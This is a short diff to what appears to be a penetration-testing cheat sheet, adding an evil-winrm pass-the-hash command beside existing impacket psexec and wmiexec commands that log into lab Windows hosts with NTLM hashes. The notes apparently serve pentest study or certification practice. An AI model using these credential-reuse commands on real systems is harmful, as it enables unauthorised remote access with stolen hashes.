@@ -515,6 +515,8 @@ If you have path traversal plus a location with write access you can exploit tha
   `/usr/share/doc/python-impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:175a592f3b0c0c5f02fad40c51412d3a Administrator@10.11.1.202 cmd.exe`  
 - Open remote connection with known hash using wmiexec:  
   `wmiexec.py ralph/user1@10.11.1.31 -hashes aad3b435b51404eeaad3b435b51404ee:7a21990fcd3d759941e45c490f143d5f`  
+- connect to target with evil-winrm:   
+  `evil-winrm -i <IP> -u <username> -H <ntlm hash>`   
 
 ## Mimikatz
 - First Mimikatz commands: (run always)  
